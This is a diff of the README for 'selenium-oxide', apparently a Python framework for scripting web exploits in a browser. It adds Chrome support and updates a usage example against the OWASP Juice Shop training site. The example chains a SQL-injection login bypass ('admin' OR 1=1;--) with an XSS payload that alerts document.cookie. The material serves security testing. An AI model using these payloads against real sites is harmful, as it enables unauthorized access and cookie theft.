@@ -15,11 +15,13 @@ multiple handy features, such as:
 * Automatic browser binary configuration
 * Cookie dumping and manipulation
 * Proxy support
+* Chrome support
+* Arbitrary selector support
+* Alert waiting
 
 Planned features include:
 
 * Payload generation
-* Chrome support
 * Web crawl functionality
 * More as suggested or encountered in field testing
 
@@ -93,17 +95,8 @@ exploit = ExploitBuilder(
     #hostname
     "juice-shop.herokuapp.com",                 
 
-    #stealth mode (default False)
-    stealth=True,
-
-    #firefox binary location (default /opt/firefox/firefox)
-    firefox_binary_path="/opt/firefox/firefox",
-
-    #use a proxy (default False)
-    useProxy=True,           
-
-    #proxy address (default 127.0.0.1:8080)
-    proxyAddress="127.0.0.1:8080"               
+    #options (explained in docs)
+    **options              
 )
 ```
 
@@ -127,9 +120,9 @@ To start building exploits, you can chain functions together!
 ```python
 (
     exploit.get("/")
-        .login("/login", "admin' OR 1=1;--", "admin", "username", "password", "login-btn")
-        .type_by_id("search-field", "<img src=\"http://url.to.file.which/not.exist\" onerror=alert(document.cookie);>")
-        .click_by_id("search-btn")
+        .login("/#/login", "admin' OR 1=1;--", "password", '//*[@id="email"]', '//*[@id="password"]', '//*[@id="loginButton"]')
+        .type_entry('//*[@id="mat-input-0"]', "<img src=\"http://url.to.file.which/not.exist\" onerror=alert(document.cookie);>")
+        .send_enter('//*[@id="mat-input-0"]')
 )
 ```
 
@@ -139,3 +132,4 @@ other functions, and further exploitation must begin on a new line.
 ### Further Reading
 
 The API documentation on [ReadtheDocs](https://selenium-oxide.readthedocs.io/) will have more information on how to use the framework to its full potential.
+
